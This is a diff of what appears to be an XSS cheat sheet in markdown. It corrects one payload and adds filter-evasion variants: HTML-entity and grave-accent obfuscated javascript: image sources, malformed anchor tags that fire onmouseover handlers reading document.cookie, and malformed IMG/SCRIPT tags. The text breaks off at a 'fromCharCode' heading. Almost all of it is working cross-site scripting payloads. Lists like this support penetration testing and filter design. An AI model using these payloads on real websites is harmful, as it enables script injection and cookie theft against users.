@@ -34,5 +34,23 @@ https://www.example.com/defaut.asp?profile=123&value=123&status=del
 ### Image XSS Using JavaScript Directive
 - No quotes or semicolons
 ```html
-<img src=javascript:alert('XSS');">
+<img src=javascript:alert('XSS')>
 ```
+- HTML entities
+```html
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+```
+- Grave accent obfuscation
+```html
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+```
+- Malformed `<a>` tags
+```html
+\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
+`\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>`
+```
+- Malformed `<img>` tags
+```html
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+```
+- `fromCharCode`
